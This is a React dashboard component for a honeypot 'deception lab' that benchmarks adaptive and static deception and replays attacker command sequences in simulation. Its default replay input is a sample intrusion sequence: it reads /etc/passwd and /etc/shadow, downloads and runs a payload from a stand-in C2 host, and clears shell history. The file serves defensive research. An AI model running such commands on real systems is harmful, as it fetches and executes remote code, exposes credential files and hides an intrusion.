import React, { useState, useEffect } from 'react';
import {
  FlaskConical,
  Clock,
  ShieldAlert,
  Zap,
  ArrowRight,
  TrendingUp,
  Play,
  RotateCcw,
  CheckCircle2,
  AlertTriangle,
  Key,
  Shield,
  HelpCircle,
} from 'lucide-react';
import api from '../../services/api';
import LoadingState from '../common/LoadingState';
import ErrorState from '../common/ErrorState';

export default function DeceptionLabView() {
  const [report, setReport] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [customCommands, setCustomCommands] = useState(
    'whoami\nuname -a\ncat /etc/passwd\ncat /etc/shadow\ncurl -O http://c2.net/payload.bin\nchmod +x payload.bin\n./payload.bin\nhistory -c'
  );
  const [runningCustom, setRunningCustom] = useState(false);

  const fetchBenchmark = async () => {
    try {
      setLoading(true);
      setError(null);
      const data = await api.getDeceptionBenchmark();
      setReport(data);
    } catch (err) {
      setError(err.message || 'Failed to retrieve Deception Lab benchmark.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchBenchmark();
  }, []);

  const handleRunCustomReplay = async () => {
    try {
      setRunningCustom(true);
      const cmdList = customCommands
        .split('\n')
        .map((c) => c.trim())
        .filter((c) => c.length > 0);
      const res = await api.runDeceptionReplay(cmdList, 'exp-user-interactive');
      setReport(res);
    } catch (err) {
      console.error('Custom replay failed:', err);
    } finally {
      setRunningCustom(false);
    }
  };

  if (loading) {
    return <LoadingState message="Executing Controlled Deception Effectiveness Benchmark..." />;
  }

  if (error || !report) {
    return <ErrorState message={error || 'Deception lab data unavailable.'} onRetry={fetchBenchmark} />;
  }

  return (
    <div className="space-y-6">
      {/* Top Banner */}
      <div className="bg-[#111726] border border-[#1f293d] p-5 rounded-xl flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-emerald-950/60 border border-emerald-800/60 rounded-lg text-emerald-400">
            <FlaskConical className="w-5 h-5" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h3 className="text-base font-bold text-slate-100 font-mono tracking-wide">
                DECEPTION EFFECTIVENESS LABORATORY
              </h3>
              <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-950 border border-emerald-800 text-emerald-400 font-mono">
                EMPIRICAL BENCHMARK
              </span>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">
              Controlled replay experiments measuring attacker dwell time, command capture rate, and canary token uptake.
            </p>
          </div>
        </div>

        <button
          onClick={fetchBenchmark}
          className="px-4 py-2 bg-[#162032] border border-[#23324f] hover:border-emerald-700/60 text-slate-200 rounded text-xs font-mono flex items-center gap-2 transition-colors self-start md:self-auto"
        >
          <RotateCcw className="w-3.5 h-3.5 text-emerald-400" />
          <span>Reset to Baseline</span>
        </button>
      </div>

      {/* Primary Comparative KPI Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Dwell Time Multiplier */}
        <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-xl space-y-1">
          <span className="text-[11px] font-mono text-slate-400 uppercase">Dwell Time Improvement</span>
          <div className="text-2xl font-bold font-mono text-emerald-400">
            {report.dwell_time_improvement_multiplier}x
          </div>
          <p className="text-[11px] text-slate-400 font-mono">
            {report.adaptive_dwell_time_seconds}s adaptive vs {report.static_dwell_time_seconds}s static
          </p>
        </div>

        {/* Command Capture Gain */}
        <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-xl space-y-1">
          <span className="text-[11px] font-mono text-slate-400 uppercase">Commands Captured</span>
          <div className="text-2xl font-bold font-mono text-cyan-400">
            +{report.command_capture_gain_percent}%
          </div>
          <p className="text-[11px] text-slate-400 font-mono">
            {report.adaptive_commands_captured} / {report.total_commands_evaluated} vs {report.static_commands_captured} static
          </p>
        </div>

        {/* Tar-Pit Cumulative Latency */}
        <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-xl space-y-1">
          <span className="text-[11px] font-mono text-slate-400 uppercase">Tar-Pit Throttling</span>
          <div className="text-2xl font-bold font-mono text-amber-400">
            {report.tar_pit_cumulative_delay_seconds}s
          </div>
          <p className="text-[11px] text-slate-400 font-mono">Cumulative latency injected to exhaust bots</p>
        </div>

        {/* Evasion Resistance */}
        <div className="p-4 bg-[#111726] border border-[#1f293d] rounded-xl space-y-1">
          <span className="text-[11px] font-mono text-slate-400 uppercase">Evasion Resistance Score</span>
          <div className="text-2xl font-bold font-mono text-purple-400">
            {(report.evasion_resistance_score_adaptive * 100).toFixed(0)}%
          </div>
          <p className="text-[11px] text-slate-400 font-mono">
            vs {(report.evasion_resistance_score_static * 100).toFixed(0)}% static honeypot
          </p>
        </div>
      </div>

      {/* Interactive Command Sequence Replay Editor */}
      <div className="bg-[#111726] border border-[#1f293d] p-5 rounded-xl space-y-4">
        <div className="flex items-center justify-between border-b border-[#1e293b] pb-2">
          <div className="flex items-center gap-2">
            <span className="text-xs font-mono font-bold text-slate-200 uppercase tracking-wider">
              Custom Attack Replay Experiment
            </span>
            <span className="text-[10px] text-slate-500 font-mono">(Zero host execution)</span>
          </div>
          <button
            onClick={handleRunCustomReplay}
            disabled={runningCustom}
            className="px-4 py-1.5 bg-gradient-to-r from-emerald-600 to-cyan-600 hover:from-emerald-500 hover:to-cyan-500 text-white rounded text-xs font-bold font-mono flex items-center gap-2 shadow-lg shadow-emerald-950/40"
          >
            <Play className="w-3.5 h-3.5" />
            <span>{runningCustom ? 'Simulating Replay...' : 'Execute Replay'}</span>
          </button>
        </div>

        <textarea
          rows={4}
          value={customCommands}
          onChange={(e) => setCustomCommands(e.target.value)}
          placeholder="Enter one shell command per line..."
          className="w-full bg-[#0a0d14] border border-[#1f293d] focus:border-cyan-500 rounded-lg p-3 text-xs font-mono text-emerald-400 placeholder-slate-600 focus:outline-none"
        />
      </div>

      {/* Side-by-Side Step Comparison Table */}
      <div className="bg-[#111726] border border-[#1f293d] rounded-xl overflow-hidden space-y-3">
        <div className="p-4 border-b border-[#1e293b] flex items-center justify-between">
          <h4 className="text-xs font-mono font-bold text-slate-200 uppercase tracking-wider">
            Replay Intervention Trace ({report.experiment_steps.length} Steps)
          </h4>
          <span className="text-[10px] font-mono text-slate-500">
            Canary Tokens Embedded: {report.honeytokens_injected_count}
          </span>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs font-mono">
            <thead className="bg-[#0d121d] text-slate-400 border-b border-[#1f293d]">
              <tr>
                <th className="py-2.5 px-4">#</th>
                <th className="py-2.5 px-4">Command</th>
                <th className="py-2.5 px-4">Intent</th>
                <th className="py-2.5 px-4 text-rose-400">Static Honeypot Response</th>
                <th className="py-2.5 px-4 text-cyan-400">Adaptive Deception Strategy</th>
                <th className="py-2.5 px-4 text-emerald-400">Canaries</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-[#162032]">
              {report.experiment_steps.map((step, idx) => (
                <tr key={idx} className="hover:bg-[#162032]/40 transition-colors">
                  <td className="py-3 px-4 text-slate-500">{idx + 1}</td>
                  <td className="py-3 px-4 text-slate-200 font-bold">$ {step.command}</td>
                  <td className="py-3 px-4 text-slate-400">{step.intent}</td>
                  <td className="py-3 px-4 text-slate-400 max-w-xs truncate text-[11px]">
                    <span className="text-rose-400">[10ms]</span> {step.static_response}
                  </td>
                  <td className="py-3 px-4 text-slate-200 max-w-xs truncate text-[11px]">
                    <span className="text-cyan-400 font-bold">[{step.adaptive_strategy} +{step.adaptive_delay_ms}ms]</span>{' '}
                    {step.adaptive_response}
                  </td>
                  <td className="py-3 px-4">
                    {step.honeytokens_delivered?.length > 0 ? (
                      <span className="text-[10px] px-2 py-0.5 rounded bg-amber-950 border border-amber-800 text-amber-400">
                        {step.honeytokens_delivered.length} token(s)
                      </span>
                    ) : (
                      <span className="text-slate-600">—</span>
                    )}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
